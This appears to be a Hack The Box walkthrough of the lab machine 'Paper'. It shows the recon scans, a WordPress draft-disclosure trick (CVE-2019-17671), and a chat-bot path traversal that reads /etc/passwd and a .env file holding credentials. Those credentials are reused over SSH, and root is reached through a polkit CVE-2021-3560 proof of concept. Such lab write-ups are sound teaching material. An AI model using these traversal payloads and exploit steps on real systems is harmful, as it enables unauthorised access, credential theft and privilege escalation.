# HTB Paper

**Machine Information**

	IP : 10.10.11.143
	OS : Linux

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.11.143 -- -sC -sV
```

```
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a:92bd:803c:ac47:d49c:5add:e44e:4f84
| SHA-1: 61a2:301f:9e5c:2603:a643:00b5:e5da:5fd5:c175:f3a9
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3
| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux
| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm
| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+
| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV
| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA
| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA
| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP
| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ
| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh
| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT
| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc
| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS
| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07
| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl
| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa
| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1
| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4
| mh/ptg==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
| tls-alpn:
|_  http/1.1
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
```

### Getting a Foothold

Accessing the web server on port 80 shows a test page without any useful information.

**Dirsearch**

Running `dirsearch` reveals two endpoints but nothing of interest is available.

```
dirsearch -u http://10.10.11.143
```

```
[19:57:23] 200 -  171B  - /.npm/anonymous-cli-metrics.json
[19:57:47] 200 -    9KB - /manual/index.html
```

Looking at the requests in Burp Suites shows something interesting. Despite the homepage returning content it is being registered as a status code 403. Checking the headers also shows a potential vhost.

```
HTTP/1.1 403 Forbidden
Date: Mon, 29 Jul 2024 10:02:23 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Update the `/etc/hosts` file. Visiting the vhost we can now see a WordPress site called **Blunder Tiffin**. This is using version 5.2.3 of WordPress which is vulnerable to CVE-2019-17671. Looking at this exploit shows an easy way to reveal additional information.

<https://www.exploit-db.com/exploits/47690>

If we append `?static=1` to our website we can see more information about Michael putting secrets in the drafts. 

<http://office.paper/?static=1>

The page also includes a link to a new vhost that we will need to updated in `/etc/hosts`.

<http://chat.office.paper/register/8qozr226AhkCHZdyY>

We can register an account and gain access to the Rocket Chat system. The chat shows a bot called `recyclops` that answers a few questions but it appears that the group chat is read only. However, there is a message from Kelly that shows that we can direct message the bot "We can also send Direct Messages to recyclops!".

Using this open a direct message to `recyclops` and type `help` to get the list of commands. Using the the `list` and `get` commands we can interact with files in on the underlying system. The bot is vulnerable to directory traversal so we can get the `/etc/passwd` file with the following command:

```
file ../../../etc/passwd
```

```
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12💯games:/usr/games:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd❌998:996:User for polkitd:/:/sbin/nologin
geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
qemu❌107:107:qemu user:/:/sbin/nologin
apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
chrony❌993:987::/var/lib/chrony:/sbin/nologin
libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
radvd❌75:75:radvd user:/:/sbin/nologin
clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
sssd❌983:981:User for sssd:/:/sbin/nologin
colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm❌42:42::/var/lib/gdm:/sbin/nologin
gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
tcpdump❌72:72::/:/sbin/nologin
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod❌976:974:mongod:/var/lib/mongo:/bin/false
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
```

Exploring the folders in the home directory shows one called `hubot`. There is a `.env` file in there that looks interesting. If we get the file it reveals credentials for the bot.

```
file ../hubot/.env
```

Since we know `dwight` is a user we can see if this password has been reused.

```
ssh dwight@10.10.11.143
```

Success!

```
[dwight@paper ~]$ w
 06:36:41 up 48 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
dwight   pts/0    10.10.14.21      06:36    1.00s  0.02s  0.00s w
```

Grab the flag.

```
cat /home/dwight/user.txt
```

### Privilege Escalation

Running `linPEAS` shows that the target machine is potentially vulnerable to CVE-2021-3560. We found the following proof of concept to use.

<https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation>

Run the exploit to create a new user with `sudo` privileges.

```
./poc.sh -u=null -p=null
```

Switch to our newly created user.

```
su - null
```

If everything worked we should be able to drop into a root shell.

```
sudo bash
```

**NOTE:** this took multiple attempts but eventually worked

Grab the flag.

```
cat /root/root.txt
```
